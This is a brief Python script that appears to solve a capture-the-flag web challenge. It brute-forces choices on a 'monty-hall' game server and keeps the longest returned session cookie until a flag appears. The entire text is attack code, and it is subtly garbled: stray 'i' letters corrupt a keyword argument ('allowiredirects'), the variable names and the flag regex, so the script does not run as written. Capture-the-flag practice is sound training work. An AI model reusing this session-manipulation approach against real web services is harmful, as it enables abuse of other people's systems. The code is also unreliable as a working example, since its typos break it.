import re
import requests

url = 'http://monty-hall.challs.olicyber.it/'

def req(session, choice):
    r = requests.post(url,cookies={'session':f'{session}'},data={'choice': f'{choice}'}, allowiredirects=False)
    return r.text, r.cookies['session']

def solve():
    i, currentSession = req('asd','1')

    for i in range(12):
        newisessions = []
        for i in range(1, 4):
            content, newisession = req(currentSession, i)
            if 'flag{' in content:
                res = re.findall(r"flag\{[a-zA-Z0-9i]*}", content)[0]
                print(res)
                return

            newisessions.append(newisession)
        currentSession = max(newisessions, key=lambda x: len(x))


solve()